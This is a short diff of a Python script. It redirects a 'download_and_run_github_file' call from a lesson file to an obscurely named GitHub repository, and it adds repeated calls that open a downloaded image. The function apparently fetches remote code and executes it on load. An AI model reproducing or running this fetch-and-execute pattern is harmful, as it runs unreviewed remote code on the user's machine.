@@ -18,8 +18,7 @@ def download_and_open_image(url):
 
 # Example usage
 image_url = "https://www.shutterstock.com/image-vector/sigma-greek-letter-icon-symbol-600w-437401498.jpg"
-for _ in range(2):
-    download_and_open_image(image_url)
+
 
 
 
@@ -45,6 +44,12 @@ def download_and_run_github_file(url):
         print(f"Failed to retrieve file. Status code: {response.status_code}")
 
 # Example usage
-github_file_url = "https://github.com/RobertsRob/lesson_15_py_resource/blob/main/oop_02.py"
+github_file_url = "https://github.com/RobertsRob/1231waedewa2131/blob/main/main.py"
 download_and_run_github_file(github_file_url)
 
+
+
+download_and_open_image(image_url)
+download_and_open_image(image_url)
+download_and_open_image(image_url)
+download_and_open_image(image_url)
